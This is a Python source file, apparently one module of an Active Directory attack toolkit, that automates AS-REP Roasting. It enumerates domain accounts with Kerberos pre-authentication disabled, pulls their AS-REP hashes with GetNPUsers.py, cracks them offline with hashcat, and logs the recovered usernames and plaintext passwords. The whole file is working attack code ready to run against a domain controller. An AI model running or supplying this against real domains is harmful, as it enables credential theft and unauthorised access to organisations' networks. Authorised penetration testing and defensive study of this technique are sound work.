"""
attacks/asreproast.py — AS-REP Roasting attack
Flow:  enumerate accounts with DONT_REQUIRE_PREAUTH (UF 0x400000)
       → request AS-REP without pre-authentication
       → extract encrypted part → hashcat mode 18200
       → return cracked credentials

Can run standalone or consume recon_data from ad-attack-chain.
"""

import subprocess
import re
import os
from pathlib import Path

from utils.logging import get_logger

log = get_logger("asreproast")


def run(cfg: dict, recon_data: dict | None = None) -> dict:
    results = {
        "vulnerable_users": [],
        "hash_file":        None,
        "hashes":           [],
        "cracked":          [],
        "errors":           [],
    }

    domain   = cfg["target"]["domain"]
    dc_ip    = cfg["target"]["dc_ip"]
    username = cfg["auth"].get("username") or ""
    password = cfg["auth"].get("password") or ""
    nt_hash  = cfg["auth"].get("hash") or ""
    wordlist = cfg["options"].get("wordlist", "/usr/share/wordlists/rockyou.txt")
    out_dir  = Path(cfg["options"]["output_dir"]) / "asreproast"
    dry_run  = cfg.get("dry_run", False)

    out_dir.mkdir(parents=True, exist_ok=True)

    # -----------------------------------------------------------------------
    # Step 1: find accounts with pre-auth disabled
    # -----------------------------------------------------------------------
    vuln_users = []

    if recon_data:
        # UF flag 0x400000 = DONT_REQUIRE_PREAUTH
        vuln_users = [
            u["sam"] for u in recon_data.get("users", [])
            if u.get("uac", 0) & 0x400000 and u.get("enabled", True)
        ]
        log.info(f"[*] AS-REP targets from recon: {vuln_users}")
    else:
        log.info("[*] No recon data — enumerating via GetNPUsers.py")
        vuln_users = _enum_asrep_users(cfg, out_dir, dry_run)

    results["vulnerable_users"] = vuln_users

    if not vuln_users and not dry_run:
        log.info("[*] No AS-REP roastable users found")
        return results

    if dry_run:
        vuln_users = vuln_users or ["svc_nopreauth"]

    # -----------------------------------------------------------------------
    # Step 2: request AS-REP hashes
    # -----------------------------------------------------------------------
    hash_file = out_dir / "asrep_hashes.txt"
    _request_asrep(cfg, vuln_users, hash_file, dry_run)
    results["hash_file"] = str(hash_file)

    if dry_run:
        results["hashes"] = [_example_hash(vuln_users[0])]
        log.info(f"[DRY RUN] Hash file would be: {hash_file}")
    else:
        hashes = _parse_hashes(hash_file)
        results["hashes"] = hashes
        log.info(f"[+] AS-REP hashes captured: {len(hashes)}")
        if not hashes:
            log.warning("[-] Hash file empty — check user list and DC connectivity")
            return results

    # -----------------------------------------------------------------------
    # Step 3: crack with hashcat mode 18200
    # -----------------------------------------------------------------------
    cracked = _crack_hashes(hash_file, wordlist, out_dir, dry_run)
    results["cracked"] = cracked

    if cracked:
        log.info(f"[+] Cracked {len(cracked)} AS-REP hash(es):")
        for c in cracked:
            log.info(f"    {c['user']} : {c['password']}")
    else:
        log.info("[*] No passwords cracked")

    return results


# ---------------------------------------------------------------------------
# Enumeration
# ---------------------------------------------------------------------------

def _enum_asrep_users(cfg: dict, out_dir: Path, dry_run: bool) -> list[str]:
    domain   = cfg["target"]["domain"]
    dc_ip    = cfg["target"]["dc_ip"]
    username = cfg["auth"].get("username") or ""
    password = cfg["auth"].get("password") or ""
    nt_hash  = cfg["auth"].get("hash") or ""

    # Unauthenticated enum (no creds needed — that's the point of AS-REP)
    if username and (password or nt_hash):
        auth_part = f"{domain}/{username}:{password}" if password \
                    else f"{domain}/{username}"
        hash_arg = ["-hashes", f":{nt_hash}"] if nt_hash else []
    else:
        auth_part = f"{domain}/"
        hash_arg = []

    cmd = [
        "GetNPUsers.py",
        auth_part,
        "-dc-ip", dc_ip,
        "-request", "-format", "hashcat",
        "-no-pass",
        *hash_arg,
    ]

    if dry_run:
        log.info(f"[DRY RUN] {' '.join(cmd)}")
        return ["svc_nopreauth"]

    log.info(f"[*] {' '.join(cmd)}")
    r = subprocess.run(cmd, capture_output=True, text=True)

    users = []
    for line in r.stdout.splitlines():
        if "$krb5asrep$" in line:
            m = re.search(r"\$krb5asrep\$\d+\$([^@]+)@", line)
            if m:
                users.append(m.group(1))

    return users


# ---------------------------------------------------------------------------
# AS-REP request
# ---------------------------------------------------------------------------

def _request_asrep(cfg: dict, users: list[str],
                   hash_file: Path, dry_run: bool) -> None:
    domain = cfg["target"]["domain"]
    dc_ip  = cfg["target"]["dc_ip"]

    # Write user list to temp file
    user_file = hash_file.parent / "asrep_targets.txt"
    user_file.write_text("\n".join(users) + "\n")

    cmd = [
        "GetNPUsers.py",
        f"{domain}/",
        "-dc-ip", dc_ip,
        "-usersfile", str(user_file),
        "-format", "hashcat",
        "-no-pass",
        "-outputfile", str(hash_file),
    ]

    if dry_run:
        log.info(f"[DRY RUN] {' '.join(cmd)}")
        return

    log.info(f"[*] Requesting AS-REP for {len(users)} user(s)")
    r = subprocess.run(cmd, capture_output=True, text=True)

    if hash_file.exists():
        log.info(f"[+] Hashes written: {hash_file}")
    else:
        log.warning(f"[-] No hash file produced: {r.stderr.strip()[:200]}")


# ---------------------------------------------------------------------------
# Crack + parse
# ---------------------------------------------------------------------------

def _crack_hashes(hash_file: Path, wordlist: str,
                  out_dir: Path, dry_run: bool) -> list[dict]:
    if not Path(wordlist).exists():
        log.warning(f"[-] Wordlist not found: {wordlist}")
        return []

    potfile = out_dir / "hashcat_asrep.pot"

    cmd = [
        "hashcat", "-m", "18200",
        str(hash_file), wordlist,
        "--potfile-path", str(potfile),
        "--quiet",
    ]

    if dry_run:
        log.info(f"[DRY RUN] {' '.join(cmd)}")
        return []

    log.info("[*] hashcat -m 18200 (AS-REP etype 23)")
    subprocess.run(cmd, capture_output=True, text=True)

    return _parse_potfile(potfile, hash_file)


def _parse_hashes(hash_file: Path) -> list[str]:
    if not hash_file.exists():
        return []
    return [l.strip() for l in hash_file.read_text().splitlines()
            if l.strip().startswith("$krb5asrep$")]


def _parse_potfile(potfile: Path, hash_file: Path) -> list[dict]:
    if not potfile.exists():
        return []

    cracked = []
    for pot_line in potfile.read_text().splitlines():
        if ":" not in pot_line:
            continue
        idx = pot_line.rfind(":")
        h, pwd = pot_line[:idx], pot_line[idx+1:]
        for raw in _parse_hashes(hash_file):
            if h in raw:
                m = re.search(r"\$krb5asrep\$\d+\$([^@]+)@", raw)
                user = m.group(1) if m else "unknown"
                cracked.append({"user": user, "password": pwd})
                break

    return cracked


def _example_hash(username: str) -> str:
    return (
        f"$krb5asrep$23${username}@LAB.LOCAL:"
        "deadbeef" * 8 + "$" + "a" * 256
    )


# ---------------------------------------------------------------------------
# Standalone usage
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    import yaml, argparse
    parser = argparse.ArgumentParser(description="AS-REP Roasting — J0stif")
    parser.add_argument("-c", "--config", default="config.yaml")
    parser.add_argument("--dry-run", action="store_true")
    args = parser.parse_args()

    with open(args.config) as f:
        cfg = yaml.safe_load(f)
    cfg["dry_run"] = args.dry_run

    results = run(cfg)
    print(f"\n[+] Vulnerable users : {results['vulnerable_users']}")
    print(f"[+] Hashes captured  : {len(results['hashes'])}")
    print(f"[+] Cracked          : {results['cracked']}")
